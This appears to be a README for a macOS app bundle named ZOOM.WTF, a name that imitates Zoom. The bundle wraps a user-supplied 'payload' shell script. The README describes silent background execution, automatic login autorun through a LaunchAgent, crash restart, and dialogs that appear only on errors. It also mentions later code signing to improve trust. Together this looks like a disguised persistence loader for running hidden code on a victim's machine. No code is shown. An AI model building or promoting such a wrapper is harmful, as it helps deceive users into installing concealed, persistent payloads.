# ZOOM.WTF for macOS

This is a real `.app` bundle scaffold.

## User flow
1. Extract this zip to Desktop.
2. Put your real payload beside `ZOOM.WTF.app` as one of:
   - `start.sh`
   - `app_to_run.sh`
   - `start.command`
   - `app_to_run.command`
3. Double-click `ZOOM.WTF.app`.

## What the app does
- installs login autorun automatically
- runs silently in background at login
- restarts the payload if it crashes
- shows dialogs only when there is a problem

## Compatibility
- Intel and Apple Silicon compatible
- no compiled native code inside this scaffold
- best trust experience still requires Apple signing/notarization later

## Logs
`~/Library/Logs/ZOOM.WTF/`

## Remove autorun
Unload and delete:
`~/Library/LaunchAgents/com.zoomwtf.autorun.plist`
